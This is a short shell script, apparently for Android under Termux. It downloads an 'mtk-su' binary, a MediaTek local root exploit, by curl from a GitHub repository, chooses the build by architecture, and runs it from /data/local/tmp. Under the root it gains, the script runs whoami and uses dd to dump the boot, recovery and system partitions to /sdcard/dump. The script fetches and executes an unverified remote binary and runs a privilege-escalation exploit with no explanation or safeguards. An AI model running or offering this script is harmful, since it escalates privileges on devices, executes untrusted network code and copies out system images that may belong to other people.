if command -v getconf &>/dev/null; then
    echo getconf: OK
else
    echo getconf: not found
    pkg install getconf -y
fi

arch=$(getconf LONG_BIT)

echo "Architecture: "$arch

if [ "$arch" = "32" ]; then
    mtk_file="mtk-su-32"
    curl -LO https://github.com/intvern/redesigned-octo-funicular/raw/refs/heads/main/mtk-su-32 --progress-bar

else
    mtk_file="mtk-su-64"
    curl -LO https://github.com/intvern/redesigned-octo-funicular/raw/refs/heads/main/mtk-su-64 --progress-bar


fi

cp "$mtk_file" /data/local/tmp

cd /data/local/tmp

chmod 755 "$mtk_file"

./"$mtk_file" -c "

whoami

mkdir -p /sdcard/dump

dd if=/dev/block/by-name/boot of=/sdcard/dump/boot.img bs=4096
dd if=/dev/block/by-name/recovery of=/sdcard/dump/recovery.img bs=4096
dd if=/dev/block/by-name/system of=/sdcard/dump/system.img bs=4096

"
